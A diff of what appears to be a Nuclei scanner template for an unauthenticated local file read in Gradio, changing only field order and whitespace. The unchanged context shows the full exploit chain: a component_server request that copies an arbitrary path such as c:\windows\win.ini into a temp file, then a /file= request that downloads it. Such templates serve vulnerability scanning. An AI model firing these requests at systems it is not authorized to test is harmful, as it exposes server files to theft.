@@ -17,11 +17,10 @@ info:
   metadata:
     verified: true
     max-request: 2
-    shodan-query: html:"__gradio_mode__"
-    product: gradio
     vendor: gradio_project
+    product: gradio
+    shodan-query: html:"__gradio_mode__"
   tags: cve,cve2024,intrusive,unauth,gradio,lfi,lfr
-
 flow: http(1) && http(2)
 
 http:
@@ -29,7 +28,6 @@ http:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-
       - |
         GET /component_server HTTP/1.1
         Host: {{Hostname}}
@@ -49,7 +47,6 @@ http:
         Content-Type: application/json
 
         {"component_id": "{{fuzz_component_id}}", "data": "{{path}}", "fn_name": "make_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}
-
       - |
         GET /file={{download_path}} HTTP/1.1
         Host: {{Hostname}}
@@ -62,7 +59,6 @@ http:
         group: 1
         regex:
           - "\"?([^\"]+)"
-
     attack: clusterbomb
     payloads:
       fuzz_component_id: helpers/wordlists/numbers.txt
@@ -71,6 +67,7 @@ http:
         - c:\\windows\\win.ini
 
     stop-at-first-match: true
+
     matchers-condition: and
     matchers:
       - type: regex
